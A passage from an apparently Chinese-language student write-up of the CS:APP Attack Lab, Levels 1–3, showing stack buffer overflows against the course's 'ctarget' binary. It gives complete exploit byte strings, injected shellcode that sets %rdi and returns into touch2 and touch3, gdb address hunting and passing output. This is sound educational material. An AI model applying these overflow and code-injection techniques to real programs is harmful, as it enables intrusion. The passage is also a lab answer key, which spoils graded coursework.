<p>对于<code>level 1</code>，你将不会注入新代码。 相反，你将<strong>利用字符串重定向程序</strong>以执行现有过程。</p>
<p><code>ctarget</code>中的<code>test</code>函数调用了<code>getbuf</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> val;</span><br><span class="line">  val = getbuf();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">  Gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当<code>getbuf</code>执行其<code>return</code>语句（<code>getbuf</code>的第5行）时，程序通常会返回到<code>test</code>（第5行）内恢复执行。 我们想改变这种行为。 在文件<code>ctarget</code>中，存在<code>touch1</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">  validate(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>你的任务是**让<code>ctarget</code>在<code>getbuf</code>执行<code>return</code>语句时执行<code>touch1</code>的代码，而不是返回<code>test</code>**。 请注意，你的字符串可能还会破坏与该阶段不直接相关的堆栈部分，但这不会引起问题，因为<code>touch1</code>会导致程序直接退出。</p>
<p>一些忠告：</p>
<ul>
<li>你可以通过检查反汇编的<code>ctarget</code>来确定为此<code>level</code>设计字符串所需的所有信息。请使用<code>objdump -d</code>获取此反汇编的代码。</li>
<li>思路是在字符串中放置<code>touch1</code>起始地址的字节表示，以便<code>getbuf</code>代码末尾的<code>ret</code>指令将控制权转移到<code>touch1</code>。</li>
<li>注意字节顺序。</li>
<li>你可能希望使用<code>gdb</code>在<code>getbuf</code>的最后几条指令中逐步执行该程序，以确保它在做正确的事情。</li>
<li><code>buf</code>在<code>getbuf</code>的堆栈帧中的放置取决于编译时常量<code>BUFFER_SIZE</code>的值以及<code>gcc</code>使用的分配策略。 你将需要检查反汇编的代码以确定其位置。</li>
</ul>
</blockquote>
<p>目的就是用字符串将<code>getbuf</code>函数重定向执行<code>touch1</code>函数。</p>
<p>首先利用<code>objdump</code>工具反汇编，并将结果重定向存入<code>ctarget.s</code>文件以便分析。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d ctarget &gt; ctarget.s</span><br></pre></td></tr></table></figure>
<hr>
<p>观察<code>test</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> val;</span><br><span class="line">  val = getbuf();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>getbuf</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">  Gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现<code>getbuf</code>函数第4行调用<code>Gets</code>读取输入的字符串并存入<code>buf</code>中，而<code>buf</code>只分配了<code>BUFFER_SIZE</code>大小的内存，所以存在缓冲区溢出漏洞。若要详细了解<code>getbuf</code>函数，则可以在<code>ctarget.s</code>中找到<code>getbuf</code>函数对应的汇编语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  ...</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
<p>4017a8分配了40字节大小的空间，可知<code>BUFFER_SIZE</code>的值为40。也就是说，<strong>当输入字符串长度超过40就会发生缓冲区溢出，而且溢出的部分就会覆盖掉原来的返回地址</strong>。</p>
<p>根据这个思路，我们可以首先输入40个字符，再输入8个字符作为溢出部分，而这8个字符就是要跳转到的<code>touch1</code>函数的地址。（<strong>地址均为8字节</strong>）</p>
<hr>
<p>为获得<code>touch1</code>函数的地址，在<code>ctarget.s</code>中找到<code>touch1</code>函数对应的汇编语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
<p>可以看到<code>touch1</code>函数的地址为<code>0x4017c0</code>，这就是我们要输入的字符串末尾的字符。</p>
<hr>
<p><span id = "hex2rawq"><a href="#hex2raw">如何得到我们要输入的字符串？</a></span></p>
<p>首先编辑用于攻击的字符串文件<code>exploit.txt</code>，同时注意<strong>机器为小端法（little endian）时地址的字节序问题</strong>（前40个字符任意输入）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00 /* address of touch1 */</span><br></pre></td></tr></table></figure>
<p>再将保存的<code>exploit.txt</code>输入到<code>ctarget</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat exploit.txt | ./hex2raw | ./ctarget -q</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 </span><br></pre></td></tr></table></figure>
<p>完成。</p>
<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><blockquote>
<p><code>level 2</code>涉及<strong>注入少量代码</strong>作为字符串的一部分。</p>
<p><code>ctarget</code>中有<code>touch2</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vlevel = <span class="number">2</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">  <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">    validate(<span class="number">2</span>); </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">    fail(<span class="number">2</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>你的任务是**让<code>ctarget</code>重定向至<code>touch2</code>并进入<code>validate</code>分支，而不是返回<code>test</code>**。</p>
<p>一些忠告：</p>
<ul>
<li>你将希望以某种方式在字符串中放置注入代码的地址的字节表示，以使<code>getbuf</code>代码末尾的<code>ret</code>指令将控制权转移给它。</li>
<li>回想一下，函数的第一个参数在寄存器<code>％rdi</code>中传递。</li>
<li>你注入的代码应将寄存器设置为<code>cookie</code>，然后使用<code>ret</code>指令进行转移控制到<code>touch2</code>中的第一条指令。</li>
<li>请勿尝试在代码中使用<code>jmp</code>或调用指令。 这些指令的目标地址的编码很难确定。 对于所有控制转移，请使用<code>ret</code>指令，即使你不是从调用处返回也是如此。</li>
<li>如何使用工具生成指令序列的字节级表示形式？</li>
</ul>
</blockquote>
<p>目的就是用字符串执行<code>touch2</code>函数，并使参数<code>val</code>等于<code>cookie</code>值。</p>
<p>和<code>level 1</code>类似，依然需要利用<code>getbuf</code>的缓冲区溢出漏洞，只不过在重定向至<code>touch2</code>之前需要将<code>cookie</code>值传入<code>％rdi</code>寄存器（函数的第一个参数）。</p>
<p>实现这个功能，造成了与<code>level 1</code>的不同之处——需要在编写的汇编代码中实现传入<code>cookie</code>值、返回到<code>touch2</code>这两个功能，而如何才能让程序执行我们编写的这段代码？因为可以将缓冲区溢出部分设置为任意地址来实现跳转，而且这段代码就存放于缓冲区中，所以可以将缓冲区溢出部分设置为<strong>缓冲区（<code>%rsp</code>）的起始地址</strong>，这样就可以跳转到我们编写的这段代码了。</p>
<hr>
<p>明确思路后，寻找<code>touch2</code>地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
<p>为<code>0x4017ec</code>。</p>
<hr>
<p>编写汇编代码（<strong>注意末尾的空行</strong>）并保存为<code>touch2.s</code>文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    $0x59b997fa,%rdi    # cookie</span><br><span class="line">push   $0x4017ec           # touch2</span><br><span class="line">ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>先传入<code>cookie</code>值，再将<code>touch2</code>地址压入栈中，执行<code>ret</code>时弹栈返回。由于栈的后进先出特点，返回地址即为后压入栈中的<code>0x4017ec</code>。</p>
<hr>
<p><span id ="generateq"><a href="#generate">如何将汇编代码转换成字节码（机器码）？</a></span></p>
<p>将<code>touch2.s</code>文件进行汇编：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c touch2.s</span><br></pre></td></tr></table></figure>
<p>反汇编：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d touch2.o</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">touch2.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">   7:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">   c:   c3                      retq </span><br></pre></td></tr></table></figure>
<p>至此，得到了汇编语句对应的字节码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59    /* mov    $0x59b997fa,%rdi */</span><br><span class="line">68 ec 17 40 00          /* pushq  $0x4017ec */</span><br><span class="line">c3                      /* retq */</span><br></pre></td></tr></table></figure>
<hr>
<p>接下来，寻找缓冲区<code>%rsp</code>的起始地址，利用<code>gdb</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb ctarget</span><br></pre></td></tr></table></figure>
<p>打断点：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) b getbuf</span><br></pre></td></tr></table></figure>
<p>运行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) r -q</span><br></pre></td></tr></table></figure>
<p>单步跟踪：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) si</span><br></pre></td></tr></table></figure>
<p>此时执行到<code>4017a8: sub $0x28,%rsp</code>处，打印<code>%rsp</code>的值（地址）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) p/x $rsp</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">1 = 0x5561dc78</span></span><br></pre></td></tr></table></figure>
<p>即<code>%rsp</code>的值为<code>0x5561dc78</code>，此即缓冲区的起始地址。</p>
<hr>
<p>和<code>level 1</code>类似，编辑用于攻击的字符串文件<code>exploit.txt</code>（<strong>注意注释周围的空格</strong>）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 /* mov    $0x59b997fa,%rdi */</span><br><span class="line">68 ec 17 40 00 /* pushq  $0x4017ec */</span><br><span class="line">c3 /* retq */</span><br><span class="line">00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 /* address of %rsp in getbuf */</span><br></pre></td></tr></table></figure>
<p>再将保存的<code>exploit.txt</code>输入到<code>ctarget</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat exploit.txt | ./hex2raw | ./ctarget -q</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 </span><br></pre></td></tr></table></figure>
<p>完成。</p>
<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><blockquote>
<p><code>level 3</code>还涉及<strong>代码注入攻击</strong>，但<strong>传递字符串</strong>作为参数。</p>
<p><code>ctarget</code>中有<code>hexmatch</code>函数和<code>touch3</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">  <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">  <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">  <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">    validate(<span class="number">3</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">    fail(<span class="number">3</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>你的任务是**让<code>ctarget</code>重定向至<code>touch3</code>并进入<code>validate</code>分支，而不是返回<code>test</code>**。</p>
<p>一些忠告：</p>
<ul>
<li>你需要在字符串中包含<code>cookie</code>的字符串表示形式。 该字符串应包含8个十六进制数字（从最高位到最低位），并且前导“<code>0x</code>”。</li>
<li>回想一下，一个字符串在C中表示为字节序列，后跟一个值为0的字节。在任何Linux机器上都可以使用“<code>man ascii</code>”查看所需字符的字节表示。</li>
<li>你注入的代码应将寄存器<code>％rdi</code>设置为该字符串的<strong>地址</strong>。</li>
<li>调用函数<code>hexmatch</code>和<code>strncmp</code>时，它们会将数据压入堆栈，覆盖保留<code>getbuf</code>使用的缓冲区的内存部分。 因此，你需要注意放置<code>cookie</code>的字符串表示形式的位置。</li>
</ul>
</blockquote>
<p><code>level 3</code>和<code>level 2</code>差不多，只不过传参为字符串而不是数值（<code>cookie</code>已知）。</p>
<p>观察<code>touch3</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">  <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">    validate(<span class="number">3</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">    fail(<span class="number">3</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现应使表达式<code>hexmatch(cookie, sval)</code>的值为1。观察<code>hexmatch</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">  <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">  <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="http://www.cplusplus.com/reference/cstring/strncmp/">什么是<code>strncmp</code>函数？</a></p>
<p><a href="http://www.cplusplus.com/reference/cstdio/sprintf/">什么是<code>sprintf</code>函数？</a></p>
<p>结合返回值为1可知<code>strncmp(sval, s, 9) == 0</code>须成立，故参数<code>sval</code>字符串就应该是<code>cookie</code>值对应的字符串。结合ASCII表，可知<code>cookie</code>值<code>0x59b997fa</code>对应字符串的十六进制值为<code>35 39 62 39 39 37 66 61 00</code>（无前导“<code>0x</code>”）。</p>
<hr>
<p>但是此处故意“Make position of check string unpredictable”——<code>char *s = cbuf + random() % 100;</code>，造成字符串<code>s</code>的位置变为随机而不可预知，再加上函数<code>touch3</code>、<code>hexmatch</code>和<code>strncmp</code>的一系列压栈导致<code>getbuf</code>缓冲区中的数据可能被重写。这样看来我们不能将<code>cookie</code>值对应的字符串放在<code>getbuf</code>缓冲区中。</p>
<hr>
<p>由于<code>test</code>函数调用了<code>getbuf</code>函数，我们可以将输入的字符串存放到<code>test</code>的栈帧中。和<code>level 2</code>寻找缓冲区起始地址类似，我们寻找<code>test</code>缓冲区的起始地址（输入和输出一同显示）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb ctarget</span><br><span class="line">GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from ctarget...done.</span><br><span class="line">(gdb) b test</span><br><span class="line">Breakpoint 1 at 0x401968: file visible.c, line 90.</span><br><span class="line">(gdb) r -q</span><br><span class="line">Starting program: /media/psf/Home/Documents/Documents_Mac/Basis of Computer Systems/homework4_target1/ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line"></span><br><span class="line">Breakpoint 1, test () at visible.c:90</span><br><span class="line">90      visible.c: 没有那个文件或目录.</span><br><span class="line">(gdb) si</span><br><span class="line">92      in visible.c</span><br><span class="line">(gdb) p/x $rsp</span><br><span class="line"><span class="meta">$</span><span class="bash">1 = 0x5561dca8</span></span><br></pre></td></tr></table></figure>
<p>得到缓冲区起始地址为<code>0x5561dca8</code>。</p>
<p>其实也可以由<code>getbuf</code>缓冲区起始地址<code>0x5561dc78</code>推算而来：<code>getbuf</code>函数分配了<code>0x28</code>字节大小的内存，<code>0x5561dc78+0x28=0x5561dca0</code>即为返回值的起始地址，也就是我们经常利用的40字节之外的缓冲区溢出部分的起始地址，此部分为8字节大小空间，<code>0x5561dca0+0x8=0x5561dca8</code>就是<code>test</code>缓冲区的起始地址。</p>
<p>这样我们又可以发现，在输入的字符串的40+8=48字节之外，再输入即可重写以地址<code>0x5561dca8</code>为起始的部分——就是我们要传入的字符串的地址。</p>
<hr>
<p><code>touch3</code>对应的汇编语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
<p>得到<code>touch3</code>的地址为<code>0x4018fa</code>。</p>
<hr>
<p>和<code>level 2</code>类似，编写汇编代码（<strong>注意末尾的空行</strong>）并保存为<code>touch3.s</code>文件（字符串传参为地址）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    $0x5561dca8,%rdi    # string</span><br><span class="line">push   $0x4018fa           # touch3</span><br><span class="line">ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>汇编并反汇编：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c touch3.s</span><br><span class="line">objdump -d touch3.o</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">touch3.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi</span><br><span class="line">   7:   68 fa 18 40 00          pushq  $0x4018fa</span><br><span class="line">   c:   c3                      retq </span><br></pre></td></tr></table></figure>
<p>至此，得到了汇编语句对应的字节码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55    /* mov    $0x5561dca8,%rdi */</span><br><span class="line">68 fa 18 40 00          /* pushq  $0x4018fa */</span><br><span class="line">c3                      /* retq */</span><br></pre></td></tr></table></figure>
<hr>
<p>和<code>level 2</code>类似，编辑用于攻击的字符串文件<code>exploit.txt</code>（<strong>注意注释周围的空格</strong>）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 /* mov    $0x5561dca8,%rdi */</span><br><span class="line">68 fa 18 40 00 /* pushq  $0x4018fa */</span><br><span class="line">c3 /* retq */</span><br><span class="line">00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 /* address of %rsp in getbuf */</span><br><span class="line">35 39 62 39 39 37 66 61 00 /* address of string */</span><br></pre></td></tr></table></figure>
<p>再将保存的<code>exploit.txt</code>输入到<code>ctarget</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat exploit.txt | ./hex2raw | ./ctarget -q</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 </span><br></pre></td></tr></table></figure>
<p>完成。</p>
<h2 id="Using-hex2raw"><a href="#Using-hex2raw" class="headerlink" title="Using hex2raw"></a><span id = "hex2raw">Using <code>hex2raw</code></span></h2><p><code>hex2raw</code>将十六进制格式的字符串作为输入。在这种格式下，每个字节值由两个十六进制数字表示。 例如，字符串“<code>012345</code>”可以十六进制格式输入为“<code>30 31 32 33 34 35 00</code>”。（请记住，十进制数字<code>X</code>的ASCII码为<code>0x3X</code>，并且字符串的结尾由空字节指示。）</p>
<p>传递给<code>hex2raw</code>的十六进制字符应由空格（空格或换行符）分隔。我们建议你在处理字符串的不同部分使用换行符分隔。 <code>hex2raw</code>支持C样式的块注释，因此你可以标记字符串的各个部分（<strong>确保在开始和结束注释字符串（“<code>/*</code> ”，“<code>*/</code>”）周围都留有空格，以便注释被忽略</strong>）。</p>
<p>如果在文件<code>exploit.txt</code>中生成了十六进制格式的字符串，则可以通过几种不同方式将原始字符串应用于<code>ctarget</code>或<code>rtarget</code>：</p>
<ol>
<li><p>你可以设置一系列管道以将字符串通过<code>hex2raw</code>传递。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">unix&gt;</span><span class="bash"> cat exploit.txt | ./hex2raw | ./ctarget</span> </span><br></pre></td></tr></table></figure></li>
<li><p>你可以将原始字符串存储在文件中并使用I/O重定向：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">unix&gt;</span><span class="bash"> ./hex2raw &lt; exploit.txt &gt; exploit-raw.txt</span></span><br><span class="line"><span class="meta">unix&gt;</span><span class="bash"> ./ctarget &lt; exploit-raw.txt</span></span><br></pre></td></tr></table></figure>
<p>从<code>gdb</code>内部运行时，也可以使用这种方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">unix&gt;</span><span class="bash"> gdb ctarget</span></span><br><span class="line">(gdb) run &lt; exploit-raw.txt</span><br></pre></td></tr></table></figure></li>
<li><p>你可以将原始字符串存储在文件中，并提供文件名作为命令行参数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">unix&gt;</span><span class="bash"> ./hex2raw &lt; exploit.txt &gt; exploit-raw.txt</span></span><br><span class="line"><span class="meta">unix&gt;</span><span class="bash"> ./ctarget -i exploit-raw.txt</span></span><br></pre></td></tr></table></figure>
<p>从<code>gdb</code>内部运行时，也可以使用这种方法。</p>
</li>
</ol>
<p><a href="#hex2rawq">点此返回</a></p>
